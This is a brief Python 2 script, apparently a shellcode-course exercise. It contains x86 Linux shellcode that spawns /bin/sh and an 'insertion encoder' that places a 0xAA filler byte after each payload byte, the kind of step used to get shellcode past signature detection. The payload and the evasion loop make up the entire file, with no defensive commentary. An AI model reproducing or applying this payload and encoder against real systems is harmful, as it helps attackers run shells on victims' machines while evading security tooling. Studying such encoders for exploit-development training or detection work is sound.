#!/usr/bin/python

# Python Insertion Encoder 
import random

shellcode = ("\x31\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
	encoded += '\\x'
	encoded += '%02x' % x
	encoded += '\\x%02x' % 0xAA

	#encoded += '\\x%02x' % random.randint(3,255)



print encoded

print 'Len: %d' % len(bytearray(shellcode))
